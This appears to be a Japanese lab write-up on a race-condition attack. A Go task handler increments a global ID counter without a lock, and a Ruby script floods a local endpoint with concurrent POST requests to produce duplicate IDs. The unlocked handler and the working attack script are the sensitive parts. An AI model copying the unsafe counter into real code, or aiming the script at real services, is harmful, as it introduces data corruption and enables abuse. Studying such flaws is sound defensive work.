## 攻撃方法

攻撃者は大量かつ高速にリクエストを送ることで、Data Raceの発生を誘発します。

`Task`には`ID`がありますが、これをHandlerで操作する際にLockしていません。

```go
type Task struct {
    ID   int    `json:"id"`
    Name string `json:"name"`
}
```

```go
func addTaskHandler(w http.ResponseWriter, r *http.Request) {
    if r.Method == http.MethodPost {
        var task Task
        if err := json.NewDecoder(r.Body).Decode(&task); err != nil {
            http.Error(w, "Bad request", http.StatusBadRequest)
            return
        }

        task.ID = nextID
        nextID++
        tasks = append(tasks, task)
```

Lockを取っていないため、同時に同じ値の`nextID`を持つスレッドが存在する可能性があります。

攻撃

```ruby
#!/usr/bin/env ruby
require 'net/http'
require 'json'
require 'concurrent'

def send_request
  url = URI('http://localhost:8019/tasks')
  data = { 'name' => 'Malicious Task' }

  begin
    http = Net::HTTP.new(url.host, url.port)
    request = Net::HTTP::Post.new(url)
    request['Content-Type'] = 'application/json'
    request.body = data.to_json

    response = http.request(request)
    JSON.parse(response.body)['id']
  rescue StandardError => e
    puts "Request failed: #{e}"
    nil
  end
end

num_requests = 100
task_ids = Concurrent::Array.new

pool = Concurrent::FixedThreadPool.new(50)

num_requests.times do
  pool.post do
    task_id = send_request
    task_ids << task_id if task_id
  end
end

pool.shutdown
pool.wait_for_termination

id_count = Hash.new(0)

task_ids.each do |task_id|
  id_count[task_id] += 1
end

duplicates = id_count.select { |_, count| count > 1 }

if duplicates.any?
  puts "Duplicate IDs detected: #{duplicates}"
else
  puts "No duplicate IDs detected"
end

```

何度か実行してみてください。攻撃が成功すると、IDが重複するはずです。
